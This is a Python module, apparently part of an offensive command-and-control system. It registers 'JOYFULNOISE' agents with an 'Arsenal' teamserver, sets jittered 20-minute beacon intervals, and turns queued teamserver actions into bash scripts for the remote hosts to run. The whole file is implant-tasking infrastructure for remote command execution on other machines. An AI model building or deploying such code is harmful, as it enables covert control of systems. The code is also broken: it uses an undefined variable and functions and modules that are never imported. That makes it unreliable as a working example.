from .utils import log
from .config import SERVER_ADDRESS

CLIENT = None
SESSIONS = {}
RESPONSES = []

def setup_arsenal():
    from .client import ArsenalClient
    from .config import API_KEY_FILE, TEAMSERVER_URI
    try:
        global CLIENT
        CLIENT = ArsenalClient(teamserver_uri=TEAMSERVER_URI, api_key_file=API_KEY_FILE)
    except Exception as E:
        log("Arsenal Error {}".format(E), level='ERROR')

def checkin(addr, name):
    """
    Handle all of the checking in for arsenal
    """
    if CLIENT is None:
        return ""
    def render_commands(commands, session_id=None):
        '''
        Turn an array of commands into a bash file
        '''
        if commands:
            newcom = ["#!/bin/bash"]
            # If we are given a session ID, show it to the client
            if session_id:
                newcom += ["# {}".format(session_id)]
            commands = newcom + commands
            commands = "\n".join(commands)
            return commands + "\n"
        if session_id:
            return "# {}\n".format(session_id)
        return ""
    
    # Check if we have a session for this callback
    key = hash(addr+"/"+name)
    if key in SESSIONS:
        session = SESSIONS.get(key, "")
    if session == "":
        session_id = new_agent(CLIENT, addr, name)
    # Now check for commands
    commands = existing_agent(CLIENT, session_id)
    return render_commands(commands, session_id)


def get_uuid_by_ip(client, addr):
    targets = client.list_targets(include_facts=True, include_status=False)
    for target in targets:
        for ints in target.facts.get('interfaces'):
            for ip in ints['ip_addrs']:
                if addr in ip:
                    return target.uuid



def new_agent(client, addr, name):
    """
    This handler is called when an agent checks in and does not have an existing
    session id.
    """
    servers = [SERVER_ADDRESS]
    data = {
        'agent_type': 'JOYFULNOISE',
        'callback_type': name,
        'target_ip': addr
    }

    facts = {
        'hostname': addr
    }

    interval = 1200  # 20 minutes
    interval_delta = 600  # +- 10 minutes
    log("Creating new session for {}".format(addr+"/"+name))
    # Try to get the UUID based on the IP
    try:
        uuid = get_uuid_by_ip(client, addr)
        if not uuid:
            print(uuid)
            raise Exception("Bad stuff")
    except Exception as E:
        print(E)
        # default to using the address as the uuid
        uuid = addr
    try:
        # Tell the teamserver to create a new session
        resp = client.create_session(
            uuid,
            servers=servers,
            interval=interval,
            interval_delta=interval_delta,
            agent_version="JOYFULNOISE 1.0",
            facts=facts,
            config_dict=data)
        # Add the session to the C2's session manager
        global SESSIONS
        key = hash(addr+"/"+name)
        SESSIONS[key] = resp
        return resp
    except Exception as E:
        slackError("{}. Returning NULL session id.".format(E))

def existing_agent(client, session):
    """
    This handler is called when an agent with a session id checks in.
    """
    if session is None:
        return []
    try:
        resp = client.session_checkin(
            session,
            responses=get_responses())
        actions = [action.raw_json for action in resp['actions']]
        # Build a list of commands for the bot
        commands, action_ids = parse_actions(actions)
        add_action_ids(action_ids)
        return commands
    except Exception as E:
        slackError("{}. Issuing default commands.".format(E))
        return []


def parse_actions(actions):
    '''
    Parse the action objects and turn them into a list of commands
    '''
    commands = []
    action_ids = []
    for action in actions:
        # Check if the action type is 1 (command)
        if action.get('action_type', 0) == 1:
            com = action.get('command')
            if com is not None:
                # Start rebuilding the command
                args = [com] + action.get('args',[])
                command = ""
                # Requote the bash arg
                for arg in args:
                    # Dont quote pipes
                    if arg in ('|',):
                        command += " " + arg
                    else:
                        command += " " + shlex.quote(arg)
                commands += [command.strip()]
            action_ids += [action.get('action_id')]
    return commands, action_ids

def add_action_ids(action_ids):
    '''
    Add the given action IDs to the response list
    '''
    global RESPONSES
    epoch = int(time.time())
    for action in action_ids:
        RESPONSES += [{
            'action_id': action,
            'stdout': '', 'stderr': '',
            'start_time': epoch, 'end_time': epoch,
            'error': False
        }]

def get_responses():
    '''
    Get all the stored up responses that we have and reset
    '''
    global RESPONSES
    retval = RESPONSES
    RESPONSES = []
    return retval